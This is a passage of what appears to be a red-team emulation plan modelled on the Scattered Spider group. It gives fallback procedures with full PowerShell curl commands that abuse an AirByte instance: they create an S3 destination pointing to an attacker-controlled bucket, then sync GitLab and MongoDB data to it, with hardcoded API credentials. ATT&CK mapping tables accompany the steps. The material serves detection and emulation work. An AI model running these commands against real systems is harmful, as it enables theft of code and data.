+<td><a href="https://www.reliaquest.com/blog/scattered-spider-attack-analysis-account-compromise/" class="outbound" target="_blank"><span>8</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-7---failure-to-set-new-airbyte-destination-via-gui">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---failure-to-set-new-airbyte-destination-via-gui">#</doc-anchor-trigger>
+        <span>Step 7 - Failure to Set New AirByte Destination via GUI</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-34">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-34">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If adding a new AirByte destination via GUI fails, perform the following
+alternative steps to add a new destination using the AirByte API.</p>
+<doc-anchor-target id="procedures-20">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-20">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to your terminal in Kali and obtain the attacker S3 access and
+secret access keys</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> From the Tactical RMM session, open an admin PowerShell prompt if one does
+not already exist, and execute the following commands to create a new
+destination in AirByte that points to the adversary-controlled S3 bucket. Make
+sure to update the command with IDs, secrets and keys where necessary.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">$accessToken = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/v1/applications/token -H &quot;Content-Type: application/json&quot; --data '{\&quot;client_id\&quot;: \&quot;fa51ae53-3b3c-4527-a6c0-b10acd8bfc23\&quot;,\&quot;client_secret\&quot;: \&quot;MsyvIBHX6uuQEPVuDLSzMVd6r8I5UV7F\&quot;,\&quot;grant-type\&quot;:\&quot;client_credentials\&quot;}' | ConvertFrom-Json).access_token;
+$workspaceId = $($(curl.exe -s http://rookery.kingslanding.net/api/public/v1/workspaces -H &quot;Authorization: Bearer $accessToken&quot; | ConvertFrom-Json).data | ?{ $_.name -eq &quot;Default Workspace&quot; } | Select-Object -First 1).workspaceId;
+$destData = '{\&quot;configuration\&quot;: {\&quot;destinationType\&quot;: \&quot;s3\&quot;,\&quot;access_key_id\&quot;: \&quot;REPLACE_WITH_ATTACKER_S3_ACCESS_KEY\&quot;,\&quot;secret_access_key\&quot;: \&quot;&lt;REPLACE_WITH_ATTACKER_S3_SECRET_ACCESS_KEY&gt;\&quot;,\&quot;s3_bucket_name\&quot;: \&quot;REPLACE_WITH_ATTACKER_S3_BUCKET_NAME\&quot;,\&quot;s3_bucket_path\&quot;: \&quot;databackup\&quot;,\&quot;s3_bucket_region\&quot;: \&quot;us-east-1\&quot;,\&quot;format\&quot;: {\&quot;format_type\&quot;: \&quot;CSV\&quot;,\&quot;flattening\&quot;: \&quot;No flattening\&quot;,\&quot;compression\&quot;: {\&quot;compression_type\&quot;: \&quot;No Compression\&quot;}}},\&quot;name\&quot;:\&quot;Weekly backup\&quot;,\&quot;workspaceId\&quot;:\&quot;' + $workspaceId + '\&quot;}';
+$result = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/public/v1/destinations -H &quot;Authorization: Bearer $accessToken&quot; -H &quot;Content-Type: application/json&quot; -H &quot;accept: application/json&quot; --data &quot;$destData&quot; | ConvertFrom-Json | ConvertTo-Json -Depth 10);
+$result</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">{
+&quot;destinationId&quot;:  &quot;ddb72a1c-a03f-459d-b3b0-bb515a18525f&quot;,
+&quot;name&quot;:  &quot;Weekly backup&quot;,
+&quot;destinationType&quot;:  &quot;s3&quot;,
+&quot;workspaceId&quot;:  &quot;5ff07c70-0ae8-4c84-bfcf-75c60a52b446&quot;,
+&quot;configuration&quot;:  {
+  &quot;format&quot;:  {
+   &quot;flattening&quot;:  &quot;No flattening&quot;,
+   &quot;compression&quot;:  &quot;@{compression_type=No Compression}&quot;,
+   &quot;format_type&quot;:  &quot;CSV&quot;
+  },
+  &quot;access_key_id&quot;:  &quot;**********&quot;,
+  &quot;s3_bucket_name&quot;:  &quot;oldtown-backup-storage&quot;,
+  &quot;s3_bucket_path&quot;:  &quot;databackup&quot;,
+  &quot;s3_bucket_region&quot;:  &quot;us-east-1&quot;,
+  &quot;secret_access_key&quot;:  &quot;**********&quot;
+}
+}</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-20">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-20">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Defense Evasion</td>
+<td>T1078.004</td>
+<td>Valid Accounts: Cloud Accounts</td>
+<td>Windows, IaaS</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider authenticates with AWS Access Key for S3</td>
+<td>fishmonger (10.55.4.102)</td>
+<td>atargaryen</td>
+<td>-</td>
+<td><a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>7</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-7---failure-to-create-new-airbyte-gitlab-connection-via-gui">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---failure-to-create-new-airbyte-gitlab-connection-via-gui">#</doc-anchor-trigger>
+        <span>Step 7 - Failure to Create New AirByte GitLab Connection via GUI</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-35">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-35">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If creating a new AirByte connection for GitLab via GUI fails, perform the
+following alternative steps to add a new connection using the AirByte API.</p>
+<doc-anchor-target id="procedures-21">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-21">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> From the Tactical RMM session, open an admin PowerShell prompt if one does
+not already exist, and execute the following commands to create a new GitLab
+connection in AirByte.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">$accessToken = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/v1/applications/token -H &quot;Content-Type: application/json&quot; --data '{\&quot;client_id\&quot;: \&quot;fa51ae53-3b3c-4527-a6c0-b10acd8bfc23\&quot;,\&quot;client_secret\&quot;: \&quot;MsyvIBHX6uuQEPVuDLSzMVd6r8I5UV7F\&quot;,\&quot;grant-type\&quot;:\&quot;client_credentials\&quot;}' | ConvertFrom-Json).access_token; $gitlabStreams = @('branches', 'commits', 'deployments', 'group_issue_boards', 'group_labels', 'group_members', 'group_milestones', 'groups', 'issues', 'jobs', 'merge_request_commits', 'merge_requests', 'pipelines', 'pipelines_extended', 'project_labels', 'project_milestones', 'projects', 'releases', 'tags', 'users'); $streams = '';foreach ($stream in $gitlabStreams) { $streams += &quot;{\`&quot;name\`&quot;: \`&quot;$stream\`&quot;,\`&quot;syncMode\`&quot;: \`&quot;full_refresh_overwrite\`&quot;},&quot; }; $streams = $streams.TrimEnd(','); $workspaceId = $($(curl.exe -s http://rookery.kingslanding.net/api/public/v1/workspaces -H &quot;Authorization: Bearer $accessToken&quot; | ConvertFrom-Json).data | ?{ $_.name -eq &quot;Default Workspace&quot; } | Select-Object -First 1).workspaceId; $destinationId = $($(curl.exe -s &quot;http://rookery.kingslanding.net/api/public/v1/destinations?workspaceIds=$workspaceId&quot; -H &quot;Authorization: Bearer $accessToken&quot; | ConvertFrom-Json).data | ?{ $_.name -eq &quot;S3&quot; } | Select-Object -First 1).destinationId; $sourceId = $($(curl.exe -s &quot;http://rookery.kingslanding.net/api/public/v1/sources?workspaceIds=$workspaceId&quot; -H &quot;Authorization: Bearer $accessToken&quot; | ConvertFrom-Json).data | ?{ $_.name -eq &quot;gitlab-internal&quot; } | Select-Object -First 1).sourceId; $destData = '{\&quot;name\&quot;: \&quot;Gitlab to S3\&quot;,\&quot;sourceId\&quot;: \&quot;' + $sourceId + '\&quot;,\&quot;destinationId\&quot;: \&quot;' + $destinationId + '\&quot;,\&quot;configurations\&quot;: {\&quot;streams\&quot;: [' + $streams + ']},\&quot;schedule\&quot;: {\&quot;scheduleType\&quot;: \&quot;manual\&quot;},\&quot;nonBreakingSchemaUpdatesBehavior\&quot;: \&quot;propagate_columns\&quot;,\&quot;namespaceDefinition\&quot;: \&quot;destination\&quot;}'; $result = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/public/v1/connections -H &quot;Authorization: Bearer $accessToken&quot; -H &quot;Content-Type: application/json&quot; -H &quot;accept: application/json&quot; --data &quot;$destData&quot; | ConvertFrom-Json); $result | ConvertTo-Json -Depth 10</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">{
+&quot;connectionId&quot;:  &quot;86f80447-decb-44ef-b81d-183120b69c4c&quot;,
+&quot;name&quot;:  &quot;Gitlab to S3&quot;,
+&quot;sourceId&quot;:  &quot;61a3ba95-e3d8-441f-b3b6-26c16c352499&quot;,
+&quot;destinationId&quot;:  &quot;ddb72a1c-a03f-459d-b3b0-bb515a18525f&quot;,
+&quot;workspaceId&quot;:  &quot;5ff07c70-0ae8-4c84-bfcf-75c60a52b446&quot;,
+&quot;status&quot;:  &quot;active&quot;,
+&quot;schedule&quot;:  {
+  &quot;scheduleType&quot;:  &quot;manual&quot;
+},
+&quot;dataResidency&quot;:  &quot;auto&quot;,
+&quot;configurations&quot;:  {
+  &quot;streams&quot;:  [
+   {
+    &quot;name&quot;:  &quot;gitlabstream_CHANGEME&quot;,
+    &quot;syncMode&quot;:  &quot;full_refresh_overwrite&quot;,
+    &quot;cursorField&quot;:  [],
+    &quot;primaryKey&quot;:  []
+   }
+  ]
+},
+&quot;nonBreakingSchemaUpdatesBehavior&quot;:  &quot;propagate_columns&quot;,
+&quot;namespaceDefinition&quot;:  &quot;destination&quot;
+}</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the same PowerShell prompt, execute the following commands to sync the
+GitLab connection and exfiltrate the data.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">$connectionId = $result.connectionId; $accessToken = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/v1/applications/token -H &quot;Content-Type: application/json&quot; --data '{\&quot;client_id\&quot;: \&quot;fa51ae53-3b3c-4527-a6c0-b10acd8bfc23\&quot;,\&quot;client_secret\&quot;: \&quot;MsyvIBHX6uuQEPVuDLSzMVd6r8I5UV7F\&quot;,\&quot;grant-type\&quot;:\&quot;client_credentials\&quot;}' | ConvertFrom-Json).access_token; $destData = '{\&quot;jobType\&quot;: \&quot;sync\&quot;,\&quot;connectionId\&quot;: \&quot;' + $connectionId + '\&quot;}';
+$startSyncResult = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/public/v1/jobs -H &quot;Authorization: Bearer $accessToken&quot; -H &quot;Content-Type: application/json&quot; -H &quot;accept: application/json&quot; --data &quot;$destData&quot; | ConvertFrom-Json | ConvertTo-Json -Depth 10); $startSyncResult</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">{
+&quot;jobId&quot;:  4,
+&quot;status&quot;:  &quot;running&quot;,
+&quot;jobType&quot;:  &quot;sync&quot;,
+&quot;startTime&quot;:  &quot;2024-11-18T19:22:44Z&quot;,
+&quot;connectionId&quot;:  &quot;86f80447-decb-44ef-b81d-183120b69c4c&quot;,
+&quot;duration&quot;:  &quot;PT1S&quot;
+}</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-21">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-21">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Collection</td>
+<td>T1213.003</td>
+<td>Data from Information Repositories: Code Repositories</td>
+<td>Windows, Linux, SaaS</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider uses Airbyte to exfiltrate GitLab data</td>
+<td>fishmonger (10.55.4.102), rookery (10.212.3.107), guildhall (10.212.3.106)</td>
+<td>atargaryen</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Exfiltration</td>
+<td>T1567.002</td>
+<td>Exfiltration Over Web Services: Exfiltration to Cloud Storage</td>
+<td>Windows, Linux, SaaS</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider exfiltrates GitLab data to attacker S3 bucket</td>
+<td>fishmonger (10.55.4.102), rookery (10.212.3.107), guildhall (10.212.3.106)</td>
+<td>atargaryen</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-7---failure-to-create-new-mongodb-connection-via-gui">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---failure-to-create-new-mongodb-connection-via-gui">#</doc-anchor-trigger>
+        <span>Step 7 - Failure to Create New MongoDB Connection via GUI</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-36">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-36">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If creating a new AirByte connection for MongoDB via GUI fails, perform the
+following alternative steps to add a new connection using the AirByte API.</p>
+<doc-anchor-target id="procedures-22">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-22">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> From the Tactical RMM session, open an admin PowerShell prompt if one does
+not already exist, and execute the following commands to create a new MongoDB
+connection in AirByte.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">$accessToken = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/v1/applications/token -H &quot;Content-Type: application/json&quot; --data '{\&quot;client_id\&quot;: \&quot;fa51ae53-3b3c-4527-a6c0-b10acd8bfc23\&quot;,\&quot;client_secret\&quot;: \&quot;MsyvIBHX6uuQEPVuDLSzMVd6r8I5UV7F\&quot;,\&quot;grant-type\&quot;:\&quot;client_credentials\&quot;}' | ConvertFrom-Json).access_token; $mongoStreams = @('__pre_attachments', '__pre_avatars', 'accessibilitySettings', 'accountSettings', 'actions', 'activities', 'announcements', 'attachments', 'boards', 'card_comment_reactions', 'card_comments', 'cards', 'checklistItems', 'checklists', 'cronHistory', 'customFields', 'integrations', 'invitation_codes', 'lists', 'meteor-migrations', 'meteor_accounts_loginServiceConfiguration', 'meteor_oauth_pendingCredentials', 'org', 'orgUser', 'rules', 'sessiondata', 'settings', 'swimlanes', 'tableVisibilityModeSettings', 'team', 'translation', 'triggers', 'unsaved-edits', 'users'); $streams = ''; foreach ($stream in $mongoStreams) { $streams += &quot;{\`&quot;name\`&quot;: \`&quot;$stream\`&quot;,\`&quot;syncMode\`&quot;: \`&quot;full_refresh_overwrite\`&quot;},&quot; }; $streams = $streams.TrimEnd(','); $workspaceId = $($(curl.exe -s http://rookery.kingslanding.net/api/public/v1/workspaces -H &quot;Authorization: Bearer $accessToken&quot; | ConvertFrom-Json).data | ?{ $_.name -eq &quot;Default Workspace&quot; } | Select-Object -First 1).workspaceId; $destinationId = $($(curl.exe -s &quot;http://rookery.kingslanding.net/api/public/v1/destinations?workspaceIds=$workspaceId&quot; -H &quot;Authorization: Bearer $accessToken&quot; | ConvertFrom-Json).data | ?{ $_.name -eq &quot;S3&quot; } | Select-Object -First 1).destinationId; $sourceId = $($(curl.exe -s &quot;http://rookery.kingslanding.net/api/public/v1/sources?workspaceIds=$workspaceId&quot; -H &quot;Authorization: Bearer $accessToken&quot; | ConvertFrom-Json).data | ?{ $_.name -eq &quot;mongo-legacy&quot; } | Select-Object -First 1).sourceId; $destData = '{\&quot;name\&quot;: \&quot;Wekans to S3\&quot;,\&quot;sourceId\&quot;: \&quot;' + $sourceId + '\&quot;,\&quot;destinationId\&quot;: \&quot;' + $destinationId + '\&quot;,\&quot;configurations\&quot;: {\&quot;streams\&quot;: [' + $streams + ']},\&quot;schedule\&quot;: {\&quot;scheduleType\&quot;: \&quot;manual\&quot;},\&quot;nonBreakingSchemaUpdatesBehavior\&quot;: \&quot;propagate_columns\&quot;,\&quot;namespaceDefinition\&quot;: \&quot;destination\&quot;}'; $result = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/public/v1/connections -H &quot;Authorization: Bearer $accessToken&quot; -H &quot;Content-Type: application/json&quot; -H &quot;accept: application/json&quot; --data &quot;$destData&quot; | ConvertFrom-Json); $result | ConvertTo-Json -Depth 10</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">{
+&quot;connectionId&quot;:  &quot;86f80447-decb-44ef-b81d-183120b69c4c&quot;,
+&quot;name&quot;:  &quot;Wekans to S3&quot;,
+&quot;sourceId&quot;:  &quot;61a3ba95-e3d8-441f-b3b6-26c16c352499&quot;,
+&quot;destinationId&quot;:  &quot;ddb72a1c-a03f-459d-b3b0-bb515a18525f&quot;,
+&quot;workspaceId&quot;:  &quot;5ff07c70-0ae8-4c84-bfcf-75c60a52b446&quot;,
+&quot;status&quot;:  &quot;active&quot;,
+&quot;schedule&quot;:  {
+  &quot;scheduleType&quot;:  &quot;manual&quot;
+},
+&quot;dataResidency&quot;:  &quot;auto&quot;,
+&quot;configurations&quot;:  {
+  &quot;streams&quot;:  [
+   {
+    &quot;name&quot;:  &quot;mongodb_streamCHANGEME&quot;,
+    &quot;syncMode&quot;:  &quot;full_refresh_overwrite&quot;,
+    &quot;cursorField&quot;:  [],
+    &quot;primaryKey&quot;:  []
+   }
+  ]
+},
+&quot;nonBreakingSchemaUpdatesBehavior&quot;:  &quot;propagate_columns&quot;,
+&quot;namespaceDefinition&quot;:  &quot;destination&quot;
+}</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In the same PowerShell prompt, execute the following commands to sync the
+MongoDB connection and exfiltrate the data.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">$connectionId = $result.connectionId; $accessToken = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/v1/applications/token -H &quot;Content-Type: application/json&quot; --data '{\&quot;client_id\&quot;: \&quot;fa51ae53-3b3c-4527-a6c0-b10acd8bfc23\&quot;,\&quot;client_secret\&quot;: \&quot;MsyvIBHX6uuQEPVuDLSzMVd6r8I5UV7F\&quot;,\&quot;grant-type\&quot;:\&quot;client_credentials\&quot;}' | ConvertFrom-Json).access_token; $destData = '{\&quot;jobType\&quot;: \&quot;sync\&quot;,\&quot;connectionId\&quot;: \&quot;' + $connectionId + '\&quot;}'; $startSyncResult = $(curl.exe -s -X POST http://rookery.kingslanding.net/api/public/v1/jobs -H &quot;Authorization: Bearer $accessToken&quot; -H &quot;Content-Type: application/json&quot; -H &quot;accept: application/json&quot; --data &quot;$destData&quot; | ConvertFrom-Json | ConvertTo-Json -Depth 10); $startSyncResult</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">{
+&quot;jobId&quot;:  4,
+&quot;status&quot;:  &quot;running&quot;,
+&quot;jobType&quot;:  &quot;sync&quot;,
+&quot;startTime&quot;:  &quot;2024-11-18T19:22:44Z&quot;,
+&quot;connectionId&quot;:  &quot;86f80447-decb-44ef-b81d-183120b69c4c&quot;,
+&quot;duration&quot;:  &quot;PT1S&quot;
+}</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-22">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-22">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Collection</td>
+<td>T1213</td>
+<td>Data from Information Repositories</td>
+<td>Windows, Linux, IaaS, SaaS</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider uses Airbyte to exfiltrate Wekan data</td>
+<td>fishmonger (10.55.4.102), rookery (10.212.3.107), dragonpit (10.212.3.105)</td>
+<td>atargaryen</td>
+<td>-</td>
+<td><a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 